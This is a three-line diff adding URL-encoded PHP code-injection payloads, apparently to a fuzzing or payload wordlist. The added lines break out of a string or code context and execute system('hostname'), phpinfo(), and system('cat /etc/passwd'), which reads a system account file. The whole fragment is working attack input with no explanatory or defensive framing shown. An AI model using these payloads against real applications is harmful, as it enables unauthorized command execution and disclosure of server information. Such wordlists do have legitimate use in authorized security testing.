@@ -1,0 +1,3 @@
+".system('hostname')%3B%23
+);}phpinfo();//
+)%3B}system('cat /etc/passwd')%3B%23
